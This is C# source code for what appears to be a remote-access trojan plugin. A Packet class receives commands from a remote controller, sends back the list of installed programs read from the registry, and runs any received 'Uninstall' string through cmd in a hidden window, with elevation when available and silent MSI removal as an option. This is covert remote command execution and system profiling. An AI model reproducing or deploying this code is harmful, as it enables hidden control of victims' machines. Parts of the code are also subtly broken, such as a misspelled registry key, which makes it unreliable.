using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;
using Leb128;
using Microsoft.Win32;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	private class InstalledProgram
	{
		public string Name { get; set; }

		public string Version { get; set; }

		public string InstallDate { get; set; }

		public string Publisher { get; set; }

		public string InstallLocation { get; set; }

		public string UninstallCommand { get; set; }
	}

	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			switch ((string)array[0])
			{
			case "Refresh":
				GetPrograms();
				break;
			case "Uninstall":
				Uninstall((string)array[1]);
				break;
			case "UninstallQuet":
				if (((string)array[1]).Contains("MsiExec.exe"))
				{
					Uninstall((string)array[1] + " /quiet");
				}
				else
				{
					Uninstall((string)array[1]);
				}
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Send(LEB128.Write(new object[3] { "Programs", "Error", ex.Message }));
			Client.Error(ex.ToString());
		}
	}

	public static void Uninstall(string command)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "cmd";
		processStartInfo.Arguments = "/c " + command;
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			processStartInfo.Verb = "runas";
		}
		processStartInfo.Arguments += " && exit";
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	public static void GetPrograms()
	{
		List<object> list = new List<object> { "Programs", "List" };
		string uninstallKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
		string uninstallKey2 = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstal";
		foreach (InstalledProgram installedProgram in GetInstalledPrograms(uninstallKey, Registry.LocalMachine))
		{
			list.AddRange(new object[6] { installedProgram.Name, installedProgram.Version, installedProgram.InstallDate, installedProgram.Publisher, installedProgram.InstallLocation, installedProgram.UninstallCommand });
			Client.Send(LEB128.Write(list.ToArray()));
		}
		foreach (InstalledProgram installedProgram2 in GetInstalledPrograms(uninstallKey2, Registry.LocalMachine))
		{
			list.AddRange(new object[6] { installedProgram2.Name, installedProgram2.Version, installedProgram2.InstallDate, installedProgram2.Publisher, installedProgram2.InstallLocation, installedProgram2.UninstallCommand });
			Client.Send(LEB128.Write(list.ToArray()));
		}
		foreach (InstalledProgram installedProgram3 in GetInstalledPrograms(uninstallKey, Registry.CurrentUser))
		{
			list.AddRange(new object[6] { installedProgram3.Name, installedProgram3.Version, installedProgram3.InstallDate, installedProgram3.Publisher, installedProgram3.InstallLocation, installedProgram3.UninstallCommand });
			Client.Send(LEB128.Write(list.ToArray()));
		}
		foreach (InstalledProgram installedProgram4 in GetInstalledPrograms(uninstallKey2, Registry.CurrentUser))
		{
			list.AddRange(new object[6] { installedProgram4.Name, installedProgram4.Version, installedProgram4.InstallDate, installedProgram4.Publisher, installedProgram4.InstallLocation, installedProgram4.UninstallCommand });
			Client.Send(LEB128.Write(list.ToArray()));
		}
	}

	private static List<InstalledProgram> GetInstalledPrograms(string uninstallKey, RegistryKey key)
	{
		List<InstalledProgram> list = new List<InstalledProgram>();
		key = key.OpenSubKey(uninstallKey);
		if (key != null)
		{
			string[] subKeyNames = key.GetSubKeyNames();
			foreach (string name in subKeyNames)
			{
				using RegistryKey registryKey = key.OpenSubKey(name);
				if (registryKey != null)
				{
					object value = registryKey.GetValue("DisplayName");
					object value2 = registryKey.GetValue("DisplayVersion");
					object value3 = registryKey.GetValue("InstallDate");
					object value4 = registryKey.GetValue("Publisher");
					object value5 = registryKey.GetValue("InstallLocation");
					object value6 = registryKey.GetValue("UninstallString");
					if (value != null)
					{
						InstalledProgram installedProgram = new InstalledProgram();
						installedProgram.Name = value.ToString();
						installedProgram.Version = ((value2 != null) ? value2.ToString() : "");
						installedProgram.InstallDate = ((value3 != null) ? value3.ToString() : "");
						installedProgram.Publisher = ((value4 != null) ? value4.ToString() : "");
						installedProgram.InstallLocation = ((value5 != null) ? value5.ToString() : "");
						installedProgram.UninstallCommand = ((value6 != null) ? value6.ToString() : "");
						list.Add(installedProgram);
					}
				}
			}
		}
		return list;
	}
}
